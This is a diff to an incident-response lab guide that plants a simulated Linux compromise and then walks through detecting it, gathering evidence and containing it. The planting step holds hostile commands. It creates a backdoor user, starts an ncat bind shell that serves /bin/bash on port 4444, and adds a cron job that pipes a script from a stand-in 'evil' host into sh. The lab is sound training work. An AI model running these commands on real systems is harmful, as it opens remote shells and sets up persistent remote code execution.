@@ -24,11 +24,14 @@ date -u >> case.txt
 ## Step 2 — Plant a "compromise"
 
 ```bash
+apt-get install -y ncat >/dev/null 2>&1 || apt-get install -y nmap >/dev/null 2>&1
 useradd -m attacker -s /bin/bash
 echo "attacker:Pwn3d!" | chpasswd
-nohup nc -lk -p 4444 -e /bin/bash >/tmp/.x 2>&1 &
+nohup ncat -lk 4444 -e /bin/bash >/tmp/.x 2>&1 &
 echo "* * * * * curl -s http://evil/loader.sh | sh" | crontab -u attacker -
 ```
+
+(Ubuntu's default `netcat-openbsd` has no `-e`; `ncat` from nmap provides the classic backdoor primitive.)
 
 ---
 
@@ -36,7 +39,7 @@ echo "* * * * * curl -s http://evil/loader.sh | sh" | crontab -u attacker -
 
 ```bash
 ss -tlnp | grep 4444
-ps -ef | grep -E "nc -lk|bash" | head
+ps -ef | grep -E "ncat|bash" | head
 crontab -u attacker -l
 last -i | head
 ```
@@ -53,7 +56,7 @@ ss -tnp > sockets.txt
 ip neigh > arp.txt
 who > who.txt
 last > last.txt
-cp /var/log/auth.log auth.log
+cp /var/log/auth.log auth.log 2>/dev/null || journalctl _COMM=sshd > auth.log
 crontab -u attacker -l > attacker.crontab
 sha256sum *.txt *.log *.crontab > evidence.sha256
 cat evidence.sha256
@@ -79,7 +82,7 @@ Containment buys time without losing forensic state.
 
 ```bash
 crontab -u attacker -r
-kill $(pidof nc) 2>/dev/null
+pkill ncat 2>/dev/null
 userdel -rf attacker
 iptables -D INPUT -p tcp --dport 4444 -j DROP
 ```
